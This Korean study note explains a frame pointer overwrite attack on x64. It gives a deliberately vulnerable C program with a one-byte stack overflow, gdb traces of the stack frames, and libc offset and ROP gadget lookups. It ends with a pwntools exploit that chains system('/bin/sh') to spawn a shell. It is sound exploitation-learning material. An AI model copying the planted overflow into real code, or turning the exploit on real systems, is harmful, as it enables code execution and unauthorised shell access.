# 04. Frame Pointer Overwrite(x64)

* 새로운 스택 프레임의 ebp에 저장되어 있을 이전 프레임의 ebp값 중 1바이트만 덮어 쓸 수 있을 때 공격 기법
* 함수가 leave될 때 조작된 ebp가 레지스터에 저장되면서 main으로 돌아가고 나서도 유지되어 main의 leave가 시작될 때 해당 ebp를 esp로 이동시키면서 조작된 ebp+4의 위치를 ret로 사용하는 것을 이용



```c
//gcc -w -no-pie -fno-stack-protector -o fpo fpo.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>

void vuln(){
    char buf[32];
    printf("buf[32] address : %p\n",buf);
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 49);
}

void main(int argc, char *argv[]){
    if(argc<2){
        printf("argv error\n");
        exit(0);
    }
    vuln();
}
```



```bash
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000004011ca <+0>:	push   rbp
   0x00000000004011cb <+1>:	mov    rbp,rsp
   0x00000000004011ce <+4>:	sub    rsp,0x10
   0x00000000004011d2 <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004011d5 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004011d9 <+15>:	cmp    DWORD PTR [rbp-0x4],0x1
   0x00000000004011dd <+19>:	jg     0x4011f5 <main+43>
   0x00000000004011df <+21>:	lea    rdi,[rip+0xe52]        # 0x402038
   0x00000000004011e6 <+28>:	call   0x401030 <puts@plt>
   0x00000000004011eb <+33>:	mov    edi,0x0
   0x00000000004011f0 <+38>:	call   0x401060 <exit@plt>
   0x00000000004011f5 <+43>:	mov    eax,0x0
   0x00000000004011fa <+48>:	call   0x401162 <vuln>
   0x00000000004011ff <+53>:	nop
   0x0000000000401200 <+54>:	leave
   0x0000000000401201 <+55>:	ret
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x0000000000401162 <+0>:	push   rbp
   0x0000000000401163 <+1>:	mov    rbp,rsp
   0x0000000000401166 <+4>:	sub    rsp,0x30
   0x000000000040116a <+8>:	lea    rax,[rbp-0x30]
   0x000000000040116e <+12>:	mov    rsi,rax
   0x0000000000401171 <+15>:	lea    rdi,[rip+0xe8c]        # 0x402004
   0x0000000000401178 <+22>:	mov    eax,0x0
   0x000000000040117d <+27>:	call   0x401040 <printf@plt>
   0x0000000000401182 <+32>:	lea    rsi,[rip+0xe91]        # 0x40201a
   0x0000000000401189 <+39>:	mov    rdi,0xffffffffffffffff
   0x0000000000401190 <+46>:	call   0x401070 <dlsym@plt>
   0x0000000000401195 <+51>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401199 <+55>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040119d <+59>:	mov    rsi,rax
   0x00000000004011a0 <+62>:	lea    rdi,[rip+0xe7a]        # 0x402021
   0x00000000004011a7 <+69>:	mov    eax,0x0
   0x00000000004011ac <+74>:	call   0x401040 <printf@plt>
   0x00000000004011b1 <+79>:	lea    rax,[rbp-0x30]
   0x00000000004011b5 <+83>:	mov    edx,0x31
   0x00000000004011ba <+88>:	mov    rsi,rax
   0x00000000004011bd <+91>:	mov    edi,0x0
   0x00000000004011c2 <+96>:	call   0x401050 <read@plt>
   0x00000000004011c7 <+101>:	nop
   0x00000000004011c8 <+102>:	leave
   0x00000000004011c9 <+103>:	ret
End of assembler dump.
gdb-peda$ b *vuln+4
Breakpoint 1 at 0x401166
gdb-peda$ b *vuln+102
Breakpoint 2 at 0x4011c8
gdb-peda$ b *main+54
Breakpoint 3 at 0x401200
gdb-peda$ r AAAABBBBCCCCDDDD
Starting program: /root/Study/LinuxExTech/04.FramePointerOverwirte/fpo AAAABBBBCCCCDDDD
```



* 첫번째 break point: vuln의 rbp에 저장되는 이전 프레임의 rbp 위치와 값 확인
  * 0x00007fffffffe480에서 0x80을 변조 가능할 것임

```
gdb-peda$ i r $rbp
rbp            0x7fffffffe460	0x7fffffffe460
gdb-peda$ x/2gx $rbp
0x7fffffffe460:	0x00007fffffffe480	0x00000000004011ff

-----------------------------
종료후 돌아갈 ret(0x00000000004011ff)
=============================
main프레임의 ebp(0x00007fffffffe480)
-----------------------------

```



* 두번째 break point: vuln의 leave 동작 확인
  * leave
    * mov rsp, rbp: 현재 rsp를 스택의 최하단으로 내림, 이렇게 되면 rsp는 저장된 이전 프레임의 ebp를 가리키게 됨
    * pop rbp: 저장된 ebp가 rbp 레지스터에 저장됨
  * 저장된 값
    * 변경할 값(main ebp주소): 0x00007fffffffe480
    * 변경할 값이 담긴 주소: 0x7fffffffe460
    * 입력값이 담기는 주소: 0x7fffffffe430
  * buf주소는 0x7fffffffe430, ebp에 저장되어 있는 타겟 ebp는 0x00007fffffffe480으로ㅓ 마지막 1바이트를 제외하고는 같으므로 1바이트만 조작해도 공격 가능
    * 0x80을 0x30으로 조작

```
gdb-peda$ c
Continuing.
buf[32] address : 0x7fffffffe430
Printf() address : 0x7ffff7e3c700

#leave 이전
gdb-peda$ i r $rsp
rsp            0x7fffffffe430	0x7fffffffe430
gdb-peda$ i r $rbp
rbp            0x7fffffffe460	0x7fffffffe460
gdb-peda$ x/2gx $rsp
0x7fffffffe430:	0x000000000000000a	0x00007ffff7e86da5
gdb-peda$ x/2gx $rbp
0x7fffffffe460:	0x00007fffffffe480	0x00000000004011ff
gdb-peda$
---------------------------------
---------------------------------
main으로의 ret(0x00000000004011ff)
=================================
main의 rbp(0x00007fffffffe480)	<-- rbp(0x7fffffffe460)
---------------------------------
......					<--- rsp(0x7fffffffe430)
---------------------------------


#leave 이후
db-peda$ i r $rsp
rsp            0x7fffffffe468	0x7fffffffe468
gdb-peda$ i r $rbp
rbp            0x7fffffffe480	0x7fffffffe480
gdb-peda$ x/2gx $rsp
0x7fffffffe468:	0x00000000004011ff	0x00007fffffffe568
gdb-peda$ x/2gx $rbp
0x7fffffffe480:	0x0000000000401210	0x00007ffff7e0809b
gdb-peda$

=================================
main이전 스택 rbp  					 <--rbp(0x00007fffffffe480)
---------------------------------
---------------------------------
main으로의 ret(0x00000000004011ff)  <--rsp(0x7fffffffe468)
=================================
main의 rbp(0x00007fffffffe480)	  <-- rbp(0x7fffffffe460)
---------------------------------
......					
---------------------------------
```

* 버퍼와 변경할 값 사이의 거리 계산
  * 48

```bash
gdb-peda$ p/d 0x7fffffffe460 - 0x7fffffffe430
$1 = 48
```

* 세번째 break point: main의 leave/ret
  * mov rsp, rbp
    * 저장된 rbp(조작할 rbp)를 rsp로 넣고: 0x00007fffffffe480를 rsp로
  * pop rbp
    * rsp 위치에 담긴 값을 rbp 레지스터에 저장하고: rbp에 0x00007fffffffe480 저장
  * pop eip
    *  다음 rsp(rbp+8)의 값을 rip로 사용: 0x7fffffffe488에 있는 0x00007ffff7e0809b를 $eip

```bash
# leave 이전
Breakpoint 3, 0x0000000000401200 in main ()
gdb-peda$ i r $rbp
rbp            0x7fffffffe480	0x7fffffffe480

# leave이후, ret 이전
gdb-peda$ ni
0x0000000000401201 in main ()
gdb-peda$ i r $rsp
rsp            0x7fffffffe488	0x7fffffffe488
gdb-peda$ x/gx $rsp
0x7fffffffe488:	0x00007ffff7e0809b

# ret 이후
gdb-peda$ ni
gdb-peda$ i r $rip
rip            0x7ffff7e0809b	0x7ffff7e0809b <__libc_start_main+235>
```

* 필요 정보 획득
  * printf: 0x7ffff7e3c700
  * system: 0x7ffff7e28bf0
  * /bin/sh: 0x7ffff7f65519
  * poprid;ret 가젯: 0x0040126b
  * libc base: 0x7ffff7de4000

```
gdb-peda$ c
Continuing.
buf[32] address : 0x7fffffffe430
Printf() address : 0x7ffff7e3c700

gdb-peda$ p printf
$2 = {int (const char *, ...)} 0x7ffff7e3c700 <__printf>
gdb-peda$ p system
$3 = {int (const char *)} 0x7ffff7e28bf0 <__libc_system>
gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7f65519 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x0040126b : (b'5fc3')	pop rdi; ret
gdb-peda$ info proc map
process 33127
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /root/Study/LinuxExTech/04.FramePointerOverwirte/fpo
            0x401000           0x402000     0x1000     0x1000 /root/Study/LinuxExTech/04.FramePointerOverwirte/fpo
/root/Study/LinuxExTech/04.FramePointerOverwirte/fpo
            0x405000           0x426000    0x21000        0x0 [heap]
      0x7ffff7de1000     0x7ffff7de4000     0x3000        0x0
      0x7ffff7de4000     0x7ffff7e06000    0x22000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.28.so
      0x7ffff7e06000     0x7ffff7f4e000   0x148000    0x22000 /usr/lib/x86_64-linux-gnu/libc-2.28.so
```

* 오프셋 계산
  * printf: 0x58700
  * system: 0x44bf0
  * /bin/sh: 0x181519

```
gdb-peda$ p/x 0x7ffff7e3c700 - 0x7ffff7de4000
$6 = 0x58700
gdb-peda$ p/x 0x7ffff7e28bf0 - 0x7ffff7de4000
$7 = 0x44bf0
gdb-peda$ p/x 0x7ffff7f65519 - 0x7ffff7de4000
$8 = 0x181519
gdb-peda$
```



## 공격코드

* 64비트 운영체제이므로 return to libc 체인은 아래와 같음
  * 8바이트 dummy + pop rdi; ret 가젯 + /bin/sh 주소 + system 주소
* 그리고 1바이트를 오버플로우 시켜야 하므로
  * rtl 체인 + 나머지dummy + 1바이트

```python
from pwn import *

p = process(['./fpo', 'AAAA'])
p.recvuntil('buf[32] address :')
bufaddr = p.recvuntil('\n')     #buf[0] address

p.recvuntil('Printf() address :')
printfaddr = p.recvuntil('\n')  #printf address
printfaddr = int(printfaddr, 16)

lastbyte = int(bufaddr[13:15], 16) # last byte of &buf[0]

libcbase = printfaddr - 0x58700 #printaddr - printfoffset
system = libcbase + 0x44bf0
binsh = libcbase + 0x181519
exit = libcbase + 0x39f50
nop = 0x9090909090909090
poprdi = 0x0040126b

rtlpayload = p64(nop) + p64(poprdi) + p64(binsh) +  p64(system) # 64bit rtl chain
offset = 48 - len(rtlpayload)
payload = rtlpayload + '\x90'*offset + p64(lastbyte)

p.send(payload)
p.interactive()
```
